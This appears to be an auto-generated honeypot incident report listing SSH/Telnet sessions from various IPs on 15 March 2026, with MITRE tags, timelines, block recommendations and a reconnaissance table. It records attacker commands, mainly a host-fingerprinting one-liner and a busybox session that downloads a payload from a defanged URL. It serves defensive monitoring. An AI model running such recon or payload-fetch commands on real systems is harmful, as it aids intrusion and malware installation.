| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:57:38` | `cowrie.session.connect` |
| `2026-03-15 09:57:38` | `cowrie.client.version` |
| `2026-03-15 09:57:38` | `cowrie.client.kex` |
| `2026-03-15 09:57:39` | `cowrie.login.success` |
| `2026-03-15 09:57:39` | `cowrie.session.params` |
| `2026-03-15 09:57:39` | `cowrie.command.input` |
| `2026-03-15 09:57:39` | `cowrie.command.input` |
| `2026-03-15 09:57:39` | `cowrie.command.input` |
| `2026-03-15 09:57:39` | `cowrie.command.input` |
| `2026-03-15 09:57:40` | `cowrie.log.closed` |
| `2026-03-15 09:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.140[.]97` to AbuseIPDB if not already reported
- [ ] Block `143.244.140[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9796608f4ac

| Field | Detail |
|---|---|
| **Source IP** | `143.244.140[.]97` |
| **First Seen** | 2026-03-15 09:58 |
| **Last Seen** | 2026-03-15 09:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:58:22` | `cowrie.session.connect` |
| `2026-03-15 09:58:22` | `cowrie.client.version` |
| `2026-03-15 09:58:22` | `cowrie.client.kex` |
| `2026-03-15 09:58:23` | `cowrie.login.success` |
| `2026-03-15 09:58:24` | `cowrie.session.params` |
| `2026-03-15 09:58:24` | `cowrie.command.input` |
| `2026-03-15 09:58:24` | `cowrie.command.input` |
| `2026-03-15 09:58:24` | `cowrie.command.input` |
| `2026-03-15 09:58:24` | `cowrie.command.input` |
| `2026-03-15 09:58:24` | `cowrie.log.closed` |
| `2026-03-15 09:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.140[.]97` to AbuseIPDB if not already reported
- [ ] Block `143.244.140[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ff2b41bfce

| Field | Detail |
|---|---|
| **Source IP** | `143.244.140[.]97` |
| **First Seen** | 2026-03-15 09:59 |
| **Last Seen** | 2026-03-15 09:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:59:06` | `cowrie.session.connect` |
| `2026-03-15 09:59:06` | `cowrie.client.version` |
| `2026-03-15 09:59:06` | `cowrie.client.kex` |
| `2026-03-15 09:59:07` | `cowrie.login.success` |
| `2026-03-15 09:59:08` | `cowrie.session.params` |
| `2026-03-15 09:59:08` | `cowrie.command.input` |
| `2026-03-15 09:59:08` | `cowrie.command.input` |
| `2026-03-15 09:59:08` | `cowrie.command.input` |
| `2026-03-15 09:59:08` | `cowrie.command.input` |
| `2026-03-15 09:59:08` | `cowrie.log.closed` |
| `2026-03-15 09:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.140[.]97` to AbuseIPDB if not already reported
- [ ] Block `143.244.140[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee49e298c9e

| Field | Detail |
|---|---|
| **Source IP** | `143.244.140[.]97` |
| **First Seen** | 2026-03-15 09:59 |
| **Last Seen** | 2026-03-15 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 09:59:50` | `cowrie.session.connect` |
| `2026-03-15 09:59:50` | `cowrie.client.version` |
| `2026-03-15 09:59:50` | `cowrie.client.kex` |
| `2026-03-15 09:59:51` | `cowrie.login.success` |
| `2026-03-15 09:59:51` | `cowrie.session.params` |
| `2026-03-15 09:59:51` | `cowrie.command.input` |
| `2026-03-15 09:59:51` | `cowrie.command.input` |
| `2026-03-15 09:59:51` | `cowrie.command.input` |
| `2026-03-15 09:59:51` | `cowrie.command.input` |
| `2026-03-15 09:59:52` | `cowrie.log.closed` |
| `2026-03-15 09:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.244.140[.]97` to AbuseIPDB if not already reported
- [ ] Block `143.244.140[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e38fb4d3728

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 10:23 |
| **Last Seen** | 2026-03-15 10:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:23:03` | `cowrie.session.connect` |
| `2026-03-15 10:23:03` | `cowrie.client.version` |
| `2026-03-15 10:23:03` | `cowrie.client.kex` |
| `2026-03-15 10:23:04` | `cowrie.login.success` |
| `2026-03-15 10:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f9e927e367f

| Field | Detail |
|---|---|
| **Source IP** | `112.81.45[.]208` |
| **First Seen** | 2026-03-15 10:32 |
| **Last Seen** | 2026-03-15 10:34 |
| **Session Duration** | 101s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox QRFWP` |
| **Download Attempts** | hxxp://112.81.45[.]208:42344/.i |
| **Malware Analysis** | tmpzmvvpi6d (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:32:55` | `cowrie.session.connect` |
| `2026-03-15 10:32:55` | `cowrie.telnet.option` |
| `2026-03-15 10:32:56` | `cowrie.login.failed` |
| `2026-03-15 10:32:56` | `cowrie.telnet.option` |
| `2026-03-15 10:32:56` | `cowrie.login.success` |
| `2026-03-15 10:32:56` | `cowrie.session.params` |
| `2026-03-15 10:32:56` | `cowrie.command.input` |
| `2026-03-15 10:32:56` | `cowrie.command.input` |
| `2026-03-15 10:32:56` | `cowrie.command.failed` |
| `2026-03-15 10:32:56` | `cowrie.command.input` |
| `2026-03-15 10:32:56` | `cowrie.command.failed` |
| `2026-03-15 10:32:56` | `cowrie.command.input` |
| `2026-03-15 10:32:56` | `cowrie.command.input` |
| `2026-03-15 10:32:56` | `cowrie.command.input` |
| `2026-03-15 10:32:57` | `cowrie.command.input` |
| `2026-03-15 10:32:57` | `cowrie.command.input` |
| `2026-03-15 10:32:57` | `cowrie.command.failed` |
| `2026-03-15 10:32:57` | `cowrie.command.input` |
| `2026-03-15 10:32:57` | `cowrie.command.input` |
| `2026-03-15 10:32:59` | `cowrie.session.file_download` |
| `2026-03-15 10:34:37` | `cowrie.log.closed` |
| `2026-03-15 10:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.81.45[.]208` to AbuseIPDB if not already reported
- [ ] Block `112.81.45[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e20b6c449ee

| Field | Detail |
|---|---|
| **Source IP** | `167.99.95[.]73` |
| **First Seen** | 2026-03-15 10:48 |
| **Last Seen** | 2026-03-15 10:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:48:21` | `cowrie.session.connect` |
| `2026-03-15 10:48:21` | `cowrie.client.version` |
| `2026-03-15 10:48:21` | `cowrie.client.kex` |
| `2026-03-15 10:48:23` | `cowrie.login.success` |
| `2026-03-15 10:48:24` | `cowrie.session.params` |
| `2026-03-15 10:48:24` | `cowrie.command.input` |
| `2026-03-15 10:48:24` | `cowrie.command.input` |
| `2026-03-15 10:48:24` | `cowrie.command.input` |
| `2026-03-15 10:48:24` | `cowrie.command.input` |
| `2026-03-15 10:48:25` | `cowrie.log.closed` |
| `2026-03-15 10:48:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.95[.]73` to AbuseIPDB if not already reported
- [ ] Block `167.99.95[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367820f0ede8

| Field | Detail |
|---|---|
| **Source IP** | `167.99.95[.]73` |
| **First Seen** | 2026-03-15 10:49 |
| **Last Seen** | 2026-03-15 10:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:49:10` | `cowrie.session.connect` |
| `2026-03-15 10:49:10` | `cowrie.client.version` |
| `2026-03-15 10:49:10` | `cowrie.client.kex` |
| `2026-03-15 10:49:12` | `cowrie.login.success` |
| `2026-03-15 10:49:13` | `cowrie.session.params` |
| `2026-03-15 10:49:13` | `cowrie.command.input` |
| `2026-03-15 10:49:13` | `cowrie.command.input` |
| `2026-03-15 10:49:13` | `cowrie.command.input` |
| `2026-03-15 10:49:13` | `cowrie.command.input` |
| `2026-03-15 10:49:14` | `cowrie.log.closed` |
| `2026-03-15 10:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.95[.]73` to AbuseIPDB if not already reported
- [ ] Block `167.99.95[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77ba21bc8f9c

| Field | Detail |
|---|---|
| **Source IP** | `167.99.95[.]73` |
| **First Seen** | 2026-03-15 10:49 |
| **Last Seen** | 2026-03-15 10:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:49:58` | `cowrie.session.connect` |
| `2026-03-15 10:49:58` | `cowrie.client.version` |
| `2026-03-15 10:49:58` | `cowrie.client.kex` |
| `2026-03-15 10:50:00` | `cowrie.login.success` |
| `2026-03-15 10:50:01` | `cowrie.session.params` |
| `2026-03-15 10:50:01` | `cowrie.command.input` |
| `2026-03-15 10:50:01` | `cowrie.command.input` |
| `2026-03-15 10:50:01` | `cowrie.command.input` |
| `2026-03-15 10:50:01` | `cowrie.command.input` |
| `2026-03-15 10:50:01` | `cowrie.log.closed` |
| `2026-03-15 10:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.95[.]73` to AbuseIPDB if not already reported
- [ ] Block `167.99.95[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dc08e76ab1

| Field | Detail |
|---|---|
| **Source IP** | `167.99.95[.]73` |
| **First Seen** | 2026-03-15 10:51 |
| **Last Seen** | 2026-03-15 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:51:05` | `cowrie.session.connect` |
| `2026-03-15 10:51:05` | `cowrie.client.version` |
| `2026-03-15 10:51:06` | `cowrie.client.kex` |
| `2026-03-15 10:51:08` | `cowrie.login.success` |
| `2026-03-15 10:51:09` | `cowrie.session.params` |
| `2026-03-15 10:51:09` | `cowrie.command.input` |
| `2026-03-15 10:51:09` | `cowrie.command.input` |
| `2026-03-15 10:51:09` | `cowrie.command.input` |
| `2026-03-15 10:51:09` | `cowrie.command.input` |
| `2026-03-15 10:51:09` | `cowrie.log.closed` |
| `2026-03-15 10:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.95[.]73` to AbuseIPDB if not already reported
- [ ] Block `167.99.95[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a8ee4828ef4

| Field | Detail |
|---|---|
| **Source IP** | `167.99.95[.]73` |
| **First Seen** | 2026-03-15 10:52 |
| **Last Seen** | 2026-03-15 10:57 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:52:04` | `cowrie.session.connect` |
| `2026-03-15 10:52:05` | `cowrie.client.version` |
| `2026-03-15 10:52:05` | `cowrie.client.kex` |
| `2026-03-15 10:52:07` | `cowrie.login.success` |
| `2026-03-15 10:52:08` | `cowrie.session.params` |
| `2026-03-15 10:52:08` | `cowrie.command.input` |
| `2026-03-15 10:52:08` | `cowrie.command.input` |
| `2026-03-15 10:52:08` | `cowrie.command.input` |
| `2026-03-15 10:52:08` | `cowrie.command.input` |
| `2026-03-15 10:52:08` | `cowrie.log.closed` |
| `2026-03-15 10:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.95[.]73` to AbuseIPDB if not already reported
- [ ] Block `167.99.95[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc0142a94e9

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 10:53 |
| **Last Seen** | 2026-03-15 10:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 10:53:29` | `cowrie.session.connect` |
| `2026-03-15 10:53:29` | `cowrie.client.version` |
| `2026-03-15 10:53:30` | `cowrie.client.kex` |
| `2026-03-15 10:53:30` | `cowrie.login.success` |
| `2026-03-15 10:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce09f30c3797

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]192` |
| **First Seen** | 2026-03-15 11:08 |
| **Last Seen** | 2026-03-15 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-15 11:08:41` | `cowrie.session.connect` |
| `2026-03-15 11:08:41` | `cowrie.client.version` |
| `2026-03-15 11:08:41` | `cowrie.client.kex` |
| `2026-03-15 11:08:42` | `cowrie.login.success` |
| `2026-03-15 11:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]192` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.41[.]67` | **25** | 2026-03-15 09:07 | 2026-03-15 09:13 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.43[.]2` | **25** | 2026-03-15 10:31 | 2026-03-15 10:36 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `101.52.130[.]122` | **11** | 2026-03-15 02:34 | 2026-03-15 02:43 | 20m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `105.27.148[.]94` | **10** | 2026-03-15 02:36 | 2026-03-15 02:58 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.51.92[.]114` | **10** | 2026-03-15 09:32 | 2026-03-15 09:54 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.36[.]245` | **10** | 2026-03-15 04:45 | 2026-03-15 05:05 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.230[.]250` | **10** | 2026-03-15 02:17 | 2026-03-15 02:39 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.194.250[.]47` | **10** | 2026-03-15 09:03 | 2026-03-15 09:26 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.240.236[.]178` | **10** | 2026-03-15 02:17 | 2026-03-15 02:40 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `179.183.192[.]58` | **10** | 2026-03-15 02:40 | 2026-03-15 03:08 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `189.152.42[.]213` | **10** | 2026-03-15 02:33 | 2026-03-15 02:54 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.218.118[.]203` | **6** | 2026-03-15 03:53 | 2026-03-15 03:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]179` | **4** | 2026-03-15 02:34 | 2026-03-15 02:43 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `3.14.84[.]197` | **3** | 2026-03-15 01:53 | 2026-03-15 01:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.90.100[.]7` | **2** | 2026-03-15 12:39 | 2026-03-15 12:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.178.115[.]83` | **2** | 2026-03-15 12:35 | 2026-03-15 12:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]198` | **2** | 2026-03-15 12:30 | 2026-03-15 12:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.241.179[.]235` | **2** | 2026-03-15 01:57 | 2026-03-15 01:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.168.34[.]38` | **2** | 2026-03-15 00:44 | 2026-03-15 00:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.189.138[.]45` | **2** | 2026-03-15 04:58 | 2026-03-15 04:59 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.24[.]58` | 1 | 2026-03-15 02:35 | 2026-03-15 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.95[.]172` | 1 | 2026-03-15 12:34 | 2026-03-15 12:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.71.37[.]70` | 1 | 2026-03-15 00:19 | 2026-03-15 00:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.220.82[.]87` | 1 | 2026-03-15 06:40 | 2026-03-15 06:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.95.13[.]221` | 1 | 2026-03-15 08:44 | 2026-03-15 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.14.162[.]81` | 1 | 2026-03-15 04:22 | 2026-03-15 04:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.30.127[.]9` | 1 | 2026-03-15 01:09 | 2026-03-15 01:09 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.7[.]45` | 1 | 2026-03-15 00:50 | 2026-03-15 00:50 | 1s | 0 | `T1592` | 🟢 LOW |
| `113.239.82[.]81` | 1 | 2026-03-15 08:33 | 2026-03-15 08:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `115.220.0[.]238` | 1 | 2026-03-15 12:35 | 2026-03-15 12:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.245.139[.]153` | 1 | 2026-03-15 07:01 | 2026-03-15 07:02 | 30s | 0 | `T1592` | 🟢 LOW |
| `119.237.27[.]185` | 1 | 2026-03-15 04:15 | 2026-03-15 04:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.198.138[.]185` | 1 | 2026-03-15 03:02 | 2026-03-15 03:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.124[.]94` | 1 | 2026-03-15 07:57 | 2026-03-15 07:59 | 120s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.20[.]170` | 1 | 2026-03-15 02:35 | 2026-03-15 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-03-15 07:23 | 2026-03-15 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.80[.]70` | 1 | 2026-03-15 02:41 | 2026-03-15 02:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.147.143[.]81` | 1 | 2026-03-15 12:15 | 2026-03-15 12:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `129.222.203[.]37` | 1 | 2026-03-15 05:07 | 2026-03-15 05:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `161.248.201[.]228` | 1 | 2026-03-15 05:10 | 2026-03-15 05:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.99.95[.]73` | 1 | 2026-03-15 10:47 | 2026-03-15 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.64.139[.]60` | 1 | 2026-03-15 01:03 | 2026-03-15 01:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-03-15 09:37 | 2026-03-15 09:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.184.82[.]249` | 1 | 2026-03-15 02:33 | 2026-03-15 02:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]164` | 1 | 2026-03-15 09:06 | 2026-03-15 09:08 | 120s | 0 | `T1592` | 🟢 LOW |
